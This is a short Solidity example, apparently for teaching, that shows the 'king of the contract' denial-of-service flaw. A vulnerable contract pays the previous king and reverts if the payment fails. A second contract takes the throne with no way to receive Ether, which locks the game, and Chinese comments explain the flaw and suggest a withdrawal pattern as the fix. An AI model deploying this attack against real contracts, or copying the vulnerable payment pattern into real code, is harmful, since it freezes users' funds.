```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Test {
    uint public kingValue;
    address public king;

    function Iking() external payable {
        require(msg.value > kingValue, "less than current value");

        (bool success,) = king.call{value: kingValue}("");
        //由于攻击者合同没有receive，转账失败，将永远卡住
        //可以使用额外变量记录参与者，提供方法可以主动撤回
        require(success, "withdraw failed");

        king = msg.sender;
        kingValue = msg.value;
    }

    
}

contract Attack {
    Test test;

    constructor(address _addr) {
        test = Test(_addr);
    }

    function attack() external payable {
        test.Iking{value: msg.value}();
    }
}
```